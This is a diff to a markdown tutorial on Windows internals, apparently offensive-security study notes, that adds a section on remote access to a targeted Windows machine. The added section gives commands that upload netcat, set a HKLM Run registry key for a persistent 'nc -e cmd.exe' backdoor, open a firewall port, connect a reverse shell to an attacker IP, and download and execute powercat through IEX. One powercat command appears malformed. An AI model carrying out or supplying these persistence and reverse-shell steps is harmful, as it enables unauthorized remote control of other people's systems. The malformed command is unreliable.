@@ -6,8 +6,8 @@
 3. Windows Command Prompt
 4. Windows Powershell
 5. Registry
-6. Windows Protection Mechanisms
-7. Getting
+6. Communicating with Windows
+7. Windows Protection Mechanisms
 
 
 ### Introduction to Windows
@@ -157,7 +157,80 @@ Again, this is just a very small program and there are many other methods / func
 ### 4. Windows Powershell
 
 
-### 6. Windows Protection Mechanisms
+### 6. Communicating with Windows
+Very often, it is highly annoying to communicate with Windows on remote systems. One possible alternative is to try installing `netcat` and establishing a reverse (TCP) shell. That is, if we are targetting the windows system, we want it to connect back to us:
+```
+Reverse Shell (What we want):
+
+		-------  WIN connect to YOU -----------
+		| YOU |  <----------------- | WINDOWS |
+		-------		     		    -----------
+
+Bind Shell (The other kind):
+
+		-------  YOU connect to WIN -----------
+		| YOU |  -----------------> | WINDOWS |
+		-------		     		    -----------
+```
+
+For this section, we assume you can obtain a shell / command prompt equivalent connection from your system to the Windows remote system. This can be potentially achieved using the Meterpreter tool as outlined [here](https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/).
+
+We first need to upload the [Windows netcat](https://eternallybored.org/misc/netcat/).
+```
+upload /path/to/nc.exe C:\Windows\System32
+```
+This places nc.exe at the location `C:\Windows\System32\nc.exe`.
+
+If we want a persistent connection, we can add netcat as a startup program by modifying the Windows registry (assume using port 9191):
+```bat
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'c:\\windows\\system32\\nc.exe -Ldp 9191 -e cmd.exe'
+
+(Check that the key "nc" really has data we want)
+reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
+```
+
+Next, we need to open a port on Windows Firewall for us to run `nc`:
+```
+netsh firewall add portopening TCP 9191 "NET CAT IS GOOD CAT" ENABLE ALL
+```
+
+We also make sure netcat locally on our (Linux) machine listens to an incoming connection (e.g. port 9191):
+```
+nc -l -p 9191
+```
+Finally, we can execute netcat on Windows which gives us a command prompt (Supposed your IP address is 123.45.67.89:
+```
+nc 123.45.67.89 9191 -e cmd.exe
+```
+
+If you prefer alternatives, you can use [powercat](https://github.com/besimorhino/powercat), which is essentially a Powershell version of netcat. To install it in Windows:
+```powershell
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+```
+
+Instead, of netcat, you kind now connect back to the same listening `nc` instance on your (Linux) machine:
+```
+powershell -c 123.45.67.89 -p 9191 -ep
+```
+Note: use `-ep` for powershell, `-e cmd` for command prompt
+
+Under very obscure situations, you may consider trying telnet despite the need for administrator privileges. To enable it on newer systems (e.g. Windows 10):
+```bat
+dism /online /Enable-Feature /FeatureName:TelnetClient
+```
+
+For your (Linux) machine (IP 123.45.67.89) that is listening (assume we want to execute `ls` command):
+```bash
+ls | nc -l -p 12345
+```
+
+And for the Windows machine (Asssume port 9191):
+```bat
+telnet 123.45.67.89 9191
+```
+
+
+### 7. Windows Protection Mechanisms
 Due to how common buffer overflow attacks might come to one's mind, Microsoft has built in some mitatigation techniques into Windows that help protect memory manipulation by adversaries.
 
 <u>Data Execution Prevention (DEP)</u>
@@ -212,7 +285,6 @@ By corrupting the `Next` Pointer or the `Handler` routine, we are able to execut
 	  Change Next Pointer of EX2   |       -------
 	  to point to BADEX instead	   |------>|BADEX|
 								           -------
-
 ```
 
 Many other mitigation techniques (e.g. [Heap Protection](https://blogs.technet.microsoft.com/srd/2009/08/04/preventing-the-exploitation-of-user-mode-heap-corruption-vulnerabilities/)) has also been implemented. Do feel free to find out more (Microsoft technet isn't a bad place to start)
